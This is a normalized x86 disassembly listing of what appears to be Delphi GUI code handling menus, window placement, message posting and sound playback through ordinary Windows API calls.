jne r-xdata
pop ebx
retn
cmp [ ebx + 0x294 ] 0x0
je r-xdata
mov eax ebx
call sub_480a00
test eax eax
je r-xdata
mov eax ebx
call sub_476718
sub_476124
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44ff44
mov eax [ ebx + 0x30 ]
mov edx [ r-xdata ]
call sub_403434
test al al
jne r-xdata
mov [ esi + 0x24 ] 0x809
mov eax ebx
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xbfffffff
or eax 0x80000000
or eax 0x4000000
or eax 0x2000000
or eax 0x0
mov [ esi + 0x4 ] eax
pop esi
pop ebx
retn
or [ esi + 0x8 ] 0x8
sub_4761a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x295 ] 0x1
mov eax [ ebp - 0x4 ]
call sub_44f950
xor edx edx
push ebp
push sub_4762d1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x190 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_474574
mov eax [ ebp - 0x4 ]
call sub_480ed8
call sub_419748
mov esi eax
dec esi
test esi esi
jl r-xdata
xor edx edx
call sub_44c794
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4762d8
mov eax [ ebp - 0x4 ]
call sub_44f958
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2ac ]
test eax eax
je r-xdata
inc esi
xor ebx ebx
push 0x0
push 0x1
push 0x85
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x188 ]
retn
mov ecx eax
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x194 ]
inc ebx
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_480ed8
mov edx ebx
call sub_47df90
mov eax [ eax + 0x40 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_480ed8
mov edx ebx
call sub_47df90
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_480ed8
mov edx ebx
call sub_47df90
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x184 ]
mov eax [ ebp - 0x4 ]
call sub_480ed8
mov edx ebx
call sub_47df90
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0xdc ]
sub_4762e0
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x2c4 ]
mov eax [ eax + 0x2b0 ]
call sub_473364
cmp ebx eax
jne r-xdata
mov eax [ ebx + 0x2c4 ]
mov eax [ eax + 0x2b0 ]
call sub_473370
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x164 ]
pop ebx
retn
sub_47631c
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x114 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax esi
call sub_4507ec
mov [ esi + 0x2c4 ] esi
mov eax esi
call sub_480a00
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edi
mov edx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x138 ]
mov dl 0x1
mov eax esi
call sub_44c794
mov eax esi
mov edx [ eax ]
call [ edx + 0x180 ]
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x164 ]
sub_4763a8
push ebx
push esi
push edi
push ebp
add esp 0xffffffbc
mov edi ecx
mov ebp edx
mov ebx eax
test ebp ebp
je r-xdata
lea ecx [ esp + 0x1c ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_41725c
lea edx [ esp + 0x1c ]
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
call sub_46b998
mov esi eax
mov edi [ ebx + 0x40 ]
mov [ esp ] edi
mov eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esi
call sub_46a7b4
mov ebp eax
mov eax esi
call sub_46a800
add ebp eax
add edi [ ebx + 0x48 ]
cmp ebp edi
jge r-xdata
test edi edi
jne r-xdata
mov eax esi
call sub_46a7b4
cmp eax [ ebx + 0x40 ]
jle r-xdata
mov eax esi
call sub_46a7b4
mov edi eax
mov eax esi
call sub_46a800
add edi eax
sub edi [ ebx + 0x48 ]
mov [ esp ] edi
mov al [ ebp + 0x227 ]
sub al 0x1
jb r-xdata
lea edx [ esp + 0x24 ]
mov eax esi
call sub_46a84c
mov edi [ esp + 0x28 ]
lea edx [ esp + 0x34 ]
mov eax esi
call sub_46a84c
add edi [ esp + 0x40 ]
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
cmp edi eax
jge r-xdata
mov eax esi
call sub_46a7b4
mov [ esp ] eax
mov edx [ edi + 0x44 ]
add edx [ edi + 0x4c ]
lea ecx [ esp + 0x1c ]
mov eax [ edi + 0x40 ]
inc eax
call sub_41725c
lea edx [ esp + 0x1c ]
mov ecx esp
mov eax ebp
call sub_44c38c
jmp r-xdata
je r-xdata
lea edx [ esp + 0x24 ]
mov eax esi
call sub_46a84c
mov eax [ esp + 0x28 ]
cmp eax [ ebx + 0x44 ]
jle r-xdata
mov eax [ ebx + 0x44 ]
sub eax [ ebx + 0x4c ]
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
push 0x0
lea eax [ esp + 0xc ]
push eax
push 0x0
push 0x1b
call SystemParametersInfoA
lea edx [ esp + 0x24 ]
mov eax edi
call sub_44c214
lea edx [ esp + 0x24 ]
lea ecx [ esp + 0x1c ]
mov eax [ edi + 0x30 ]
call sub_44c38c
mov eax [ esp + 0x1c ]
mov [ esp + 0xc ] eax
mov eax [ esp + 0x20 ]
mov [ esp + 0x10 ] eax
lea edx [ esp + 0x24 ]
mov eax edi
call sub_44c214
lea edx [ esp + 0x2c ]
lea ecx [ esp + 0x1c ]
mov eax [ edi + 0x30 ]
call sub_44c38c
mov eax [ esp + 0x1c ]
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x20 ]
mov [ esp + 0x18 ] eax
lea edx [ esp + 0xc ]
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
call sub_46b9c8
mov esi eax
mov eax esi
call sub_46a7b4
cmp eax [ esp ]
jle r-xdata
mov edx [ edi + 0x44 ]
add edx [ edi + 0x4c ]
mov eax [ edi + 0x40 ]
sub eax [ ebx + 0x48 ]
add eax [ edi + 0x48 ]
lea ecx [ esp + 0x1c ]
call sub_41725c
lea edx [ esp + 0x1c ]
mov ecx esp
mov eax ebp
call sub_44c38c
jmp r-xdata
jmp r-xdata
lea edx [ esp + 0x24 ]
mov eax esi
call sub_46a84c
mov eax [ esp + 0x28 ]
cmp eax [ esp + 0x4 ]
jle r-xdata
lea edx [ esp + 0x24 ]
mov eax esi
call sub_46a84c
mov eax [ esp + 0x28 ]
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x24 ]
mov eax esi
call sub_46a84c
mov eax [ esp + 0x2c ]
push eax
lea edx [ esp + 0x38 ]
mov eax esi
call sub_46a84c
mov eax [ esp + 0x38 ]
pop edx
call sub_47639c
mov edx [ esp ]
add edx [ ebx + 0x48 ]
cmp eax edx
jge r-xdata
mov eax esi
call sub_46a7b4
mov [ esp ] eax
lea edx [ esp + 0x24 ]
mov eax edi
call sub_44c214
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax [ edi + 0x30 ]
call sub_44c38c
mov eax [ edi + 0x48 ]
add [ esp ] eax
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x44
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x24 ]
mov eax esi
call sub_46a84c
mov eax [ esp + 0x28 ]
mov [ esp + 0x4 ] eax
jmp r-xdata
lea edx [ esp + 0x24 ]
mov eax esi
call sub_46a84c
mov eax [ esp + 0x30 ]
cmp eax [ ebx + 0x4c ]
jge r-xdata
lea edx [ esp + 0x24 ]
mov eax esi
call sub_46a84c
mov eax [ esp + 0x2c ]
push eax
lea edx [ esp + 0x38 ]
mov eax esi
call sub_46a84c
mov eax [ esp + 0x38 ]
pop edx
call sub_47639c
sub eax [ ebx + 0x48 ]
mov [ esp ] eax
mov eax edi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
lea edx [ esp + 0x24 ]
mov eax esi
call sub_46a84c
mov eax [ esp + 0x30 ]
push eax
lea edx [ esp + 0x38 ]
mov eax esi
call sub_46a84c
mov eax [ esp + 0x3c ]
pop edx
call sub_47639c
mov ebp [ esp + 0x4 ]
mov edx ebp
add edx [ ebx + 0x4c ]
cmp eax edx
jge r-xdata
mov eax esi
call sub_46a7e8
mov [ esp + 0x4 ] eax
jmp r-xdata
lea edx [ esp + 0x24 ]
mov eax esi
call sub_46a84c
mov eax [ esp + 0x24 ]
push eax
lea edx [ esp + 0x38 ]
mov eax esi
call sub_46a84c
pop eax
add eax [ esp + 0x3c ]
sub eax [ ebp + 0x40 ]
add eax [ ebp + 0x48 ]
mov edx [ esp ]
add edx [ ebx + 0x48 ]
cmp eax edx
jge r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ ebp + 0x40 ]
sub eax [ ebx + 0x48 ]
add eax 0x2
mov [ esp ] eax
sub ebp [ ebx + 0x4c ]
add ebp [ edi + 0x4c ]
add ebp 0x3
mov [ esp + 0x4 ] ebp
sub ebp [ edi + 0x4c ]
sub ebp [ ebx + 0x4c ]
mov [ esp + 0x4 ] ebp
jmp r-xdata
sub_476718
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x30c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x18c ]
mov ecx ebx
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x30c ] esi
mov dl 0x6
mov eax esi
call sub_44bd60
mov [ esi + 0x1cc ] 0x1
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx 0x2
mov eax esi
call sub_4715d4
lea edx [ esi + 0x80 ]
mov eax [ rw-data ]
call sub_405df8
mov dl 0x1
mov eax esi
call sub_4715f0
mov dl 0x3
mov eax esi
call sub_47160c
mov eax [ ebx + 0x210 ]
call sub_47d750
test al al
je r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebx + 0x210 ]
mov al [ eax + 0x14 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax esi
call sub_4837b8
mov [ esi + 0x1c4 ] ebx
mov [ esi + 0x1c0 ] sub_4762e0
mov dl 0x1
sub_4767d8
push ebx
push esi
push edi
mov esi edx
mov edi eax
movzx eax [ esi + 0x4 ]
cmp eax 0x28
jg r-xdata
sub eax 0x2d
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
sub eax 0x40
jne r-xdata
cmp [ esi + 0x4 ] 0x28
jne r-xdata
sub eax 0x25
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4747d4
test eax eax
je r-xdata
mov edx esi
mov eax edi
call sub_4752ec
mov eax edi
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
je r-xdata
cmp [ edi + 0x294 ] 0x0
je r-xdata
mov eax [ edi + 0x2fc ]
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax edi
call sub_4747d4
mov ebx eax
mov eax ebx
call sub_4193b8
mov ebx eax
call sub_464204
test al 0x1
je r-xdata
mov eax edi
call sub_4747d4
test eax eax
je r-xdata
mov eax edi
call sub_4747d4
mov ebx eax
mov eax edi
call sub_4809c8
cmp ebx eax
je r-xdata
mov eax [ edi + 0x2a8 ]
test eax eax
je r-xdata
mov [ eax + 0x296 ] 0x0
xor eax eax
mov [ edi + 0x2fc ] eax
xor eax eax
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_4747d4
test eax eax
je r-xdata
jmp r-xdata
mov eax [ edi + 0x210 ]
call sub_47d6b0
mov edx ebx
call sub_419948
mov ebx eax
mov eax [ ebx + 0x40 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xd8 ]
mov eax edi
call sub_47b62c
inc ebx
mov eax edi
call sub_4747d4
call sub_4193b8
push eax
mov eax edi
call sub_480ed8
pop edx
call sub_419948
mov ebx eax
mov edx r-xdata
mov eax ebx
call sub_47ef98
mov eax [ ebx + 0x40 ]
mov dl 0x1
call sub_44c794
mov eax [ ebx + 0x40 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xd8 ]
jmp r-xdata
mov eax [ edi + 0x30c ]
mov si 0xffeb
call sub_4034a4
mov eax edi
call sub_480a00
mov edx [ eax + 0x40 ]
mov eax edi
call sub_47508c
jmp r-xdata
call sub_464204
test al 0x4
je r-xdata
mov edx esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
mov eax [ edi + 0x2c4 ]
cmp edi eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
je r-xdata
mov edx esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
mov eax edi
call sub_4747d4
call sub_47d670
test al al
je r-xdata
mov eax edi
call sub_4747d4
call sub_47d670
test al al
jne r-xdata
cmp [ edi + 0x2b0 ] 0x0
jne r-xdata
mov eax edi
call sub_4747d4
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax edi
call sub_4747d4
cmp [ eax + 0x50 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2c4 ]
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
mov eax edi
call sub_4747d4
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax edi
call sub_4747d4
call sub_47eb64
test eax eax
jne r-xdata
mov eax edi
call sub_4747d4
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0xe0 ]
jmp r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
je r-xdata
call sub_464204
test al 0x4
je r-xdata
mov eax edi
call sub_4747d4
call sub_47d6b0
call sub_47deac
mov eax edi
call sub_4747d4
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_476a77
inc [ ecx ]
add [ eax ] al
add [ 0x53000000 ] ch
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc8 ]
pop esi
pop ebx
retn
sub_476aa0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_454288
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_425570
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_476b4c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_4255f0
mov eax [ ebp - 0x4 ]
call sub_48254c
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov eax [ eax + 0x14 ]
call sub_424c70
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_44c214
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_4250a4
push 0x0
mov edx [ ebx + 0x4 ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_4510f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476b53
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov edx [ ebp - 0x8 ]
call sub_4255f0
retn
sub_476b58
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_481978
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_480a00
test eax eax
je r-xdata
mov eax ebx
call sub_4809c8
test eax eax
je r-xdata
cmp [ eax + 0x50 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
cmp [ eax + 0x50 ] 0x0
je r-xdata
xor edx edx
mov eax [ eax + 0x40 ]
call sub_44c794
cmp [ ebx + 0x210 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x114 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
xor edx edx
mov eax [ eax + 0x40 ]
call sub_44c794
mov eax ebx
call sub_453094
mov eax ebx
mov si 0xffee
call sub_4034a4
mov ecx [ ebx + 0x2ac ]
mov edx [ ebx + 0x2a8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x194 ]
cmp [ ebx + 0x2a8 ] 0x0
je r-xdata
inc edi
xor esi esi
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov dl 0x1
mov eax ebx
call sub_473abc
inc esi
dec edi
jne r-xdata
mov eax ebx
call sub_480ed8
mov edx esi
call sub_47df90
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x1c ]
cmp [ ebx + 0x2c4 ] 0x0
je r-xdata
mov eax ebx
call sub_480ed8
mov edx esi
call sub_47df90
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x2
push 0x0
call sndPlaySoundA
push 0x13
push r-xdata
call sndPlaySoundA
sub_476c6a
add [ eax ] al
push ebx
add esp 0xfffffff8
mov ebx eax
xor edx edx
mov eax ebx
call sub_44c794
cmp [ ebx + 0x2c4 ] 0x0
je r-xdata
mov eax ebx
call sub_473bdc
pop ecx
pop edx
pop ebx
retn
mov edx esp
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4579c8
mov eax [ ebx + 0x2c4 ]
mov edx [ esp ]
mov [ eax + 0x29c ] edx
mov edx [ esp + 0x4 ]
mov [ eax + 0x2a0 ] edx
sub_476cb8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_453180
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf8 ]
add [ esi ] eax
pop esi
pop ebx
retn
sub_476ce0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_453c00
mov ebx eax
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xf8 ]
add [ esi ] eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_476d08
push ebx
mov ebx eax
cmp [ ebx + 0x314 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
cmp [ ebx + 0x310 ] 0x0
jne r-xdata
mov eax [ ebx + 0x310 ]
test eax eax
je r-xdata
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46f4b0
mov [ ebx + 0x310 ] eax
push 0x1
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46f4b0
mov [ ebx + 0x308 ] eax
mov edx ebx
call sub_46f5dc
mov edx ebx
mov eax [ ebx + 0x308 ]
call sub_46f5dc
sub_476d98
push ebx
mov ebx eax
mov eax ebx
call sub_481d3c
mov eax ebx
call sub_48254c
test eax eax
je r-xdata
pop ebx
retn
mov eax ebx
call sub_48254c
mov edx [ eax + 0x74 ]
mov eax ebx
call sub_44ca14
sub_476dc0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_4757f0
test [ esi + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_403458
xor edx edx
call sub_44c794
sub_476e1c
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_480468
mov eax ebx
call sub_48254c
mov edx [ eax + 0x74 ]
mov eax [ ebx + 0x21c ]
mov eax [ eax + 0x14 ]
call sub_424c70
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x21c ]
call sub_4250a4
add esp 0x10
pop ebx
retn
sub_476e5c
push ebx
push esi
push edi
add esp 0xffffffe8
mov ebx eax
mov eax ebx
call sub_478ae8
mov edx [ ebx + 0x48 ]
add edx 0x12
mov eax ebx
call sub_44c008
lea ecx [ esp + 0x10 ]
mov eax [ ebx + 0x172 ]
add eax 0x12
mov edx [ ebx + 0x176 ]
call sub_41725c
mov eax [ esp + 0x10 ]
mov [ ebx + 0x172 ] eax
mov eax [ esp + 0x14 ]
mov [ ebx + 0x176 ] eax
lea esi [ ebx + 0x190 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x0
push 0x12
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
mov esi esp
lea edi [ ebx + 0x190 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_476ed4
push ebp
mov ebp esp
push ecx
push esi
mov [ ebp - 0x1 ] cl
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov eax esi
call sub_479118
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
pop ecx
pop ebp
retn 0x8
sub_476f08
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_475d6c
mov eax esi
mov edx [ rw-data ]
call sub_403434
test al al
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
test bl bl
je r-xdata
mov [ edi + 0x318 ] esi
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_476f5c
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x320 ]
call sub_4032a8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_475e64
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_476f8c
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi eax
mov ecx [ esp ]
mov eax edi
call sub_476ce0
mov ebx eax
mov esi [ edi + 0x2b0 ]
test esi esi
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_42c354
test eax eax
jle r-xdata
xor ebx ebx
sub_476fd0
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x114 ]
cmp esi eax
jge r-xdata
mov eax [ ebx + 0x210 ]
call sub_47d6b0
mov edx esi
call sub_47df90
mov eax [ eax + 0x40 ]
pop esi
pop ebx
retn
sub_477008
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x210 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_47d6b0
call sub_419748
pop esi
pop ebx
retn
sub_47702c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2c4 ]
mov eax [ eax + 0x2ac ]
call sub_4840c8
mov eax [ eax + 0x210 ]
call sub_47d6b0
mov edi eax
mov eax edi
call sub_419748
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
call sub_47df90
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_47df90
call sub_47eb64
push eax
mov eax [ ebp - 0x4 ]
call sub_47eb64
pop edx
cmp edx eax
jne r-xdata
sub_4770ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x324 ]
cmp eax [ ebx + 0x16c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x198 ]
mov edx eax
mov eax ebx
call sub_403434
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_474110
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x17c ]
mov ebx [ ebx + 0x16c ]
push 0x0
push 0x0
push 0xb409
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x318 ]
call sub_4530b8
push eax
call PostMessageA
jmp r-xdata
push ebp
mov eax [ ebx + 0x16c ]
call sub_47702c
pop ecx
mov esi eax
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x16c ]
call sub_4193b8
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c4 ]
mov eax [ eax + 0x2ac ]
call sub_4840c8
mov eax [ eax + 0x210 ]
call sub_47d6b0
pop edx
call sub_419948
mov esi eax
mov eax [ ebx + 0x16c ]
call sub_47eb64
mov edx eax
mov eax esi
call sub_47ee8c
mov dl [ esi + 0x30 ]
xor dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x318 ]
call sub_44f978
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x318 ]
mov eax esi
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov edx esi
mov ecx [ eax + 0x44 ]
mov eax [ eax + 0x40 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor ebx ebx
jmp r-xdata
mov eax [ esi + 0x40 ]
xor edx edx
call sub_44c794
jmp r-xdata
sub_4771e8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
mov edx [ r-xdata ]
call sub_403458
mov edi eax
mov eax edi
call sub_47d690
cmp eax [ ebx + 0x31c ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403458
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x110 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x198 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
sub_477258
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_47498c
mov esi eax
mov [ esi + 0x23c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x19c ]
mov [ esi + 0x238 ] eax
mov dl [ ebx + 0x314 ]
mov eax esi
call sub_476e08
mov eax esi
pop esi
pop ebx
retn
sub_4772b8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax [ ebp - 0x8 ]
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0xc ] 0x0
cmp [ ebp - 0xd ] 0x0
jne r-xdata
inc ebx
xor esi esi
inc [ ebp - 0xc ]
dec [ ebp - 0x14 ]
jne r-xdata
mov eax edi
call sub_47deac
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_47df90
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor edx edx
mov eax ebx
call sub_47d9a8
or edx 0xffffffff
mov eax ebx
call sub_47f23c
inc esi
dec ebx
jne r-xdata
mov [ ebp - 0xd ] 0x1
jmp r-xdata
mov [ ebp - 0xd ] 0x0
mov eax edi
call sub_419748
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx esi
mov eax edi
call sub_47df90
call sub_47eb64
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_47df90
call sub_47eb64
pop edx
cmp edx eax
jne r-xdata
sub_47736c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
